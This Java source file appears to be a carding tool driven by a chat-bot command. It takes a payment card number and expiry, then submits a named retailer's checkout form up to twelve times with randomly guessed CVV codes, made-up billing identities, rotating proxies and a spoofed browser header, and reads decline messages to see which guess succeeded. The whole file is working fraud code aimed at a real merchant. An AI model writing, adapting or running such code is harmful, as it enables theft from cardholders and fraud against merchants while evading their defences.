package com.tammudu.files;

import javax.net.ssl.HttpsURLConnection;
import java.net.URL;
import java.net.Proxy;
import java.net.InetSocketAddress;
import java.util.Base64;
import java.util.regex.Pattern;
import java.io.OutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.List;

public class RealTimePaymentProcessor {

    private static final String API_URL = "https://www.suzanns.com/checkout/billing_review.jsp?_DARGS=/checkout/billing_review.jsp.billingReviewForm";

    private static final Random random = new Random();

    public static String processPayment(String cardDetails) {
        try {
            List<Proxies.ProxyInfo> proxies = null;
            
            if (Proxies.isProxyEnabled()) {
                proxies = Proxies.loadProxies();
                if (proxies.isEmpty()) {
                    return "❌ No proxies loaded. Please check proxies.txt.";
                }
            }

            String[] parts = cardDetails.split("\\|");
            if (parts.length < 3) {
                return "❌ Invalid input format. Use /duck card|month|year|cvv";
            }
            String ccNumber = parts[0].trim();
            String expMonth = parts[1].trim();
            String expYear = parts[2].trim();

            validateInputs(ccNumber, expMonth, expYear);

            Proxies.ProxyInfo selectedProxy = null;
            if (Proxies.isProxyEnabled() && proxies != null && !proxies.isEmpty()) {
                selectedProxy = proxies.get(random.nextInt(proxies.size()));
            }

            for (int i = 0; i < 12; i++) {  // 🔥 12 Attempts (was 7)
                String randomCVV = generateRandomCVV();
                String serverResponse = sendPayment(ccNumber, expMonth, expYear, randomCVV, selectedProxy);

                if (serverResponse != null) {
                    return serverResponse;  // Return immediately if server responds with an error
                }

                Thread.sleep(150);  // 🔥 Random sleep 100ms to 400ms
            }

            return "✅ Now check your card in Checker.";

        } catch (Exception e) {
            return "❌ Error during payment: " + e.getMessage();
        }
    }

    private static String sendPayment(String ccNumber, String expMonth, String expYear, String cvv, Proxies.ProxyInfo proxyInfo) throws Exception {
        URL url = new URL(API_URL);
        HttpsURLConnection conn;

        if (Proxies.isProxyEnabled() && proxyInfo != null) {
            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyInfo.host, proxyInfo.port));
            conn = (HttpsURLConnection) url.openConnection(proxy);

            if (proxyInfo.username != null && !proxyInfo.username.trim().isEmpty()) {
                String encoded = Base64.getEncoder().encodeToString((proxyInfo.username + ":" + proxyInfo.password).getBytes());
                conn.setRequestProperty("Proxy-Authorization", "Basic " + encoded);
            }
        } else {
            conn = (HttpsURLConnection) url.openConnection();
        }

        conn.setConnectTimeout(3000);
        conn.setReadTimeout(3000);
        conn.setRequestMethod("POST");

        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
        conn.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0");
        conn.setRequestProperty("Origin", "https://www.suzanns.com");
        conn.setRequestProperty("Referer", "https://www.suzanns.com/checkout/billing_review.jsp?_requestid=5667778");
        conn.setRequestProperty("Upgrade-Insecure-Requests", "1");
        conn.setRequestProperty("Connection", "keep-alive");

        conn.setDoOutput(true);

        String formPayload = generateFormPayload(ccNumber, expMonth, expYear, cvv);

        try (OutputStream os = conn.getOutputStream()) {
            os.write(formPayload.getBytes(StandardCharsets.UTF_8));
            os.flush();
        }

        int responseCode = conn.getResponseCode();
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
        StringBuilder responseContent = new StringBuilder();
        String inputLine;
        while ((inputLine = in.readLine()) != null) {
            responseContent.append(inputLine);
        }
        in.close();

        String responseText = responseContent.toString();

        if (responseCode != 200) {
            return "❌ Failed: Server returned response code " + responseCode;
        }

        // Search for known failure terms
        if (responseText.contains("Do not honor") || responseText.contains("call issuer") || responseText.contains("declined") || responseText.toLowerCase().contains("invalid")) {
            return "❌ Payment declined or error: " + responseText;
        }

        return null;
    }

    private static String generateFormPayload(String ccNumber, String expMonth, String expYear, String cvv) {
        String billingFirstName = RandomBillingInfo.randomFirstName();
        String billingLastName = RandomBillingInfo.randomLastName();
        String billingAddress1 = RandomBillingInfo.randomAddress();
        String billingCity = RandomBillingInfo.randomCity();
        String billingState = RandomBillingInfo.randomStateCode();
        String billingZip = RandomBillingInfo.randomZip();
        String billingCountry = "US";
        String billingPhone = RandomBillingInfo.randomPhone();
        String billingEmail = RandomBillingInfo.randomEmail();
        String dynSessConf = RandomBillingInfo.randomDynSessConf();
        String cardSelect = "FDPYT1001";

        return
            "_DARGS=" + encode("/checkout/billing_review.jsp.billingReviewForm") +
            "&_dyncharset=" + encode("UTF-8") +
            "&_dynSessConf=" + encode(dynSessConf) +
            "&cardSelect=" + encode(cardSelect) +
            "&cc_number=" + encode(ccNumber) +
            "&_D:cc_number=" +
            "&commWebSessionId=" +
            "&_D:commWebSessionId=" +
            "&cc_number_hidden=" + encode(ccNumber) +
            "&_D:cc_number_hidden=" +
            "&ccType=VI" +
            "&_D:ccType=" +
            "&ccpaymentTypeId=" + encode(cardSelect) +
            "&_D:ccpaymentTypeId=" +
            "&ccTypeVal=VI" +
            "&is_cvv_required=true" +
            "&cvv_number=" + encode(cvv) +
            "&_D:cvv_number=" +
            "&cc_month=" + encode(expMonth) +
            "&_D:cc_month=" +
            "&cc_year=" + encode(expYear) +
            "&_D:cc_year=" +
            "&first_name=" + encode(billingFirstName) +
            "&_D:first_name=" +
            "&last_name=" + encode(billingLastName) +
            "&_D:last_name=" +
            "&/atg/commerce/order/purchase/BillingInfoBean.billingAddress=0" +
            "&address1=" + encode(billingAddress1) +
            "&_D:address1=" +
            "&address2=" +
            "&_D:address2=" +
            "&city=" + encode(billingCity) +
            "&_D:city=" +
            "&territory=" + encode(billingState) +
            "&_D:territory=" +
            "&zip=" + encode(billingZip) +
            "&_D:zip=" +
            "&country=" + encode(billingCountry) +
            "&_D:country=" +
            "&phone_number=" + encode(billingPhone) +
            "&_D:phone_number=" +
            "&phone_type=Mobile" +
            "&email=" + encode(billingEmail) +
            "&_D:email=" +
            "&billingReviewSubBtn=Submit" +
            "&_D:billingReviewSubBtn=" +
            "&_DARGS=" + encode("/checkout/billing_review.jsp.billingReviewForm");
    }

    private static String encode(String value) {
        return URLEncoder.encode(value, StandardCharsets.UTF_8);
    }

    private static String generateRandomCVV() {
        int randomCVV = 100 + random.nextInt(900);
        return String.valueOf(randomCVV);
    }

    public static void validateInputs(String ccNumber, String expMonth, String expYear) throws Exception {
        expMonth = expMonth.trim();
        expYear = expYear.trim();

        if (!Pattern.matches("^\\d{13,19}$", ccNumber)) {
            throw new Exception("Invalid credit card number");
        }
        if (!Pattern.matches("^(0[1-9]|1[0-2])$", expMonth)) {
            throw new Exception("Invalid expiration month");
        }
        if (!Pattern.matches("^\\d{2,4}$", expYear)) {
            throw new Exception("Invalid expiration year");
        }
    }
}
